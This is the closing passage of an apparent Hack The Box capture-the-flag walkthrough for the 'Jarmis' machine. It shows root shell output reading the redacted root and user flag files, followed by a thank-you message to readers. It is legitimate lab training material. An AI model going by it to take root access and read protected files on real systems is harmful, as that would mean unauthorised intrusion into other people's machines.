bash: cannot set terminal process group (17369): Inappropriate ioctl for device
bash: no job control in this shell
root@Jarmis:/var/opt/microsoft/scx/tmp# cd /root/
cd /root/
root@Jarmis:/root# cat root.txt
cat root.txt
e6d014840d<redacted>
root@Jarmis:/root# ls /home
ls /home
htb
root@Jarmis:/root# cat /home/htb/user.txt
cat /home/htb/user.txt
e2848e17<redacted>
root@Jarmis:/root# 
```
{{< typeit >}} I hope you enjoyed my walkthrough, It took me lot of time to contruct everything, With that being said I hope that you would share this to your connections. But I have to mention this, if it weren't for 0xdf this walkthrough wouldn't possible. Thank you for reading this, Hey! I really meant that Thank you.. See you soon on another
{{< /typeit >}}

![bye](https://media1.tenor.com/m/cTQhkMn8dLgAAAAC/car-bye.gif)
